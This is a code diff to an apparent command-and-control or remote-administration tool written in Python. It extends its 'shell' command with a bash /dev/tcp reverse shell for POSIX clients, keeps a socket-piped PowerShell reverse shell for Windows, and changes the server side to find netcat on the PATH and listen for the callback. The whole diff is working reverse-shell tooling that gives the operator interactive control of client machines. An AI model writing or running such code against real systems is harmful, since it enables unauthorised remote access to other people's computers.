@@ -1958,28 +1958,32 @@ class Geolocate(DoubleCommand):
 
 @add_double_command(
     "shell",
-    "shell",
+    "shell { netcat executable path }",
     "Runs and interactive shell on the client",
-    [],
-    supported_os=[OSType.ms_windows],
+    [ArgumentType.optional_string],
     no_new_process=True,
     no_multitask=True,
     max_selected=1,
 )
 class Shell(DoubleCommand):
     @staticmethod
-    def client_side(sock: socket.socket) -> None:
+    def __posix_client(address: str, port: int) -> None:
+        import subprocess
+
+        subprocess.run(
+            f"bash -c 'bash -i >& /dev/tcp/{address}/{port} 0>&1'", shell=True
+        )
+
+    @staticmethod
+    def __windows_client(shell_sock: socket.socket) -> None:
         # shell structure from revshells.com
         import subprocess
         import threading
-        import socket
 
-        def server_to_peer(
-            sock: socket.socket, process: subprocess.Popen, running: dict[str, bool]
-        ) -> None:
+        def server_to_peer(process: subprocess.Popen, running: dict[str, bool]) -> None:
             while running["running"]:
                 try:
-                    data = sock.recv(1024)
+                    data = shell_sock.recv(1024)
                 except TimeoutError:
                     continue
                 except OSError:
@@ -1988,20 +1992,12 @@ class Shell(DoubleCommand):
                     process.stdin.write(data)  # type: ignore
                     process.stdin.flush()  # type: ignore
 
-        def peer_to_server(
-            sock: socket.socket, process: subprocess.Popen, running: dict[str, bool]
-        ) -> None:
+        def peer_to_server(process: subprocess.Popen, running: dict[str, bool]) -> None:
             while running["running"]:
                 try:
-                    sock.send(process.stdout.read(1))  # type: ignore
+                    shell_sock.send(process.stdout.read(1))  # type: ignore
                 except OSError:
                     return
-
-        try:
-            if not recieve_boolean(sock):
-                return
-        except OSError:
-            return
 
         powershell_process = subprocess.Popen(
             ["powershell"],
@@ -2010,18 +2006,10 @@ class Shell(DoubleCommand):
             stdin=subprocess.PIPE,
         )
 
-        try:
-            shell_sock = socket.socket()
-            shell_sock.setblocking(True)
-            shell_sock.settimeout(5)
-            shell_sock.connect((sock.getpeername()[0], recieve_integer(sock)))
-        except OSError:
-            return
-
         running = {"running": True}
         s2p_thread = threading.Thread(
             target=server_to_peer,
-            args=[shell_sock, powershell_process, running],
+            args=[powershell_process, running],
             name="Reverse shell S2P",
         )
         s2p_thread.daemon = True
@@ -2029,7 +2017,7 @@ class Shell(DoubleCommand):
 
         p2s_thread = threading.Thread(
             target=peer_to_server,
-            args=[shell_sock, powershell_process, running],
+            args=[powershell_process, running],
             name="Reverse shell P2S",
         )
         p2s_thread.daemon = True
@@ -2037,25 +2025,36 @@ class Shell(DoubleCommand):
 
         powershell_process.wait()
         running["running"] = False
-        shell_sock.close()
+
+    @staticmethod
+    def client_side(sock: socket.socket) -> None:
+        import socket
+        import sys
+
+        try:
+            if not recieve_boolean(sock):
+                return
+        except OSError:
+            return
+
+        if sys.platform == "win32":
+            try:
+                shell_sock = socket.socket()
+                shell_sock.setblocking(True)
+                shell_sock.settimeout(5)
+                shell_sock.connect((sock.getpeername()[0], recieve_integer(sock)))
+            except OSError:
+                return
+            Shell.__windows_client(shell_sock)
+            shell_sock.close()
+        else:
+            Shell.__posix_client(sock.getpeername()[0], recieve_integer(sock))
 
     @staticmethod
     def server_side(client: Client, params: tuple) -> CommandResult:
-        import sys
-
-        if sys.platform != "win32":
-            print("You must be on windows to use this command")
-            try:
-                send_boolean(client.socket, False)
-            except OSError:
-                pass
-            return CommandResult(DoubleCommandResult.failure)
-
-        from shared.command_consts import NETCAT_B64_ZLIB_EXE
         import subprocess
         import socket
-        import base64
-        import zlib
+        import sys
         import os
 
         def find_random_port() -> int:
@@ -2065,32 +2064,60 @@ class Shell(DoubleCommand):
             sock.close()
             return port
 
-        def bail(msg: str) -> None:
-            print(msg)
-            os.remove(temp_file)
+        def is_in_path(filename: str) -> bool:
+            path_dirs = os.getenv("PATH").split(os.pathsep)  # type: ignore
+            for directory in path_dirs:
+                filepath = os.path.join(directory, filename)
+                if os.path.isfile(filepath):
+                    return True
+            return False
+
+        if len(params) > 0:
+            netcat_filename = params[0]
+            if not os.path.isfile(netcat_filename):
+                try:
+                    send_boolean(client.socket, netcat_filename != None)
+                except OSError:
+                    pass
+
+                print("Provided netcat executable path not found")
+                return CommandResult(DoubleCommandResult.param_error)
+        else:
+            netcat_filename = None
+            for possible_netcat_filename in (
+                ("nc.exe", "ncat.exe", "netcat.exe")
+                if sys.platform == "win32"
+                else ("nc", "ncat", "netcat")
+            ):
+                if is_in_path(possible_netcat_filename):
+                    netcat_filename = possible_netcat_filename
+                    break
+
+            if netcat_filename == None:
+                print(
+                    "Netcat (nc/ncat/netcat) executable not found in path, please provide a path in the first command argument."
+                )
 
         try:
-            send_boolean(client.socket, True)
+            send_boolean(client.socket, netcat_filename != None)
+            if netcat_filename == None:
+                return CommandResult(DoubleCommandResult.failure)
         except OSError:
-            print("Failed to sent verification message to client")
+            print("Failed to send verification message to client")
             return CommandResult(DoubleCommandResult.conn_error)
-
-        temp_file = f"{os.getenv('TEMP')}/nc.exe"
-        with open(temp_file, "wb") as netcat_exe:
-            netcat_exe.write(zlib.decompress(base64.b64decode(NETCAT_B64_ZLIB_EXE)))
 
         port = find_random_port()
         try:
             send_integer(client.socket, port)
         except OSError:
-            bail("Failed to send port to client")
+            print("Failed to send port to client")
             return CommandResult(DoubleCommandResult.conn_error)
 
         subprocess.Popen(
-            [temp_file, "-lp", str(port)],
+            f"{netcat_filename} -lp {port}",
             shell=True,
         ).wait()
-        bail("Connection terminated")
+        print("Connection terminated")
 
         return CommandResult(DoubleCommandResult.success)
 
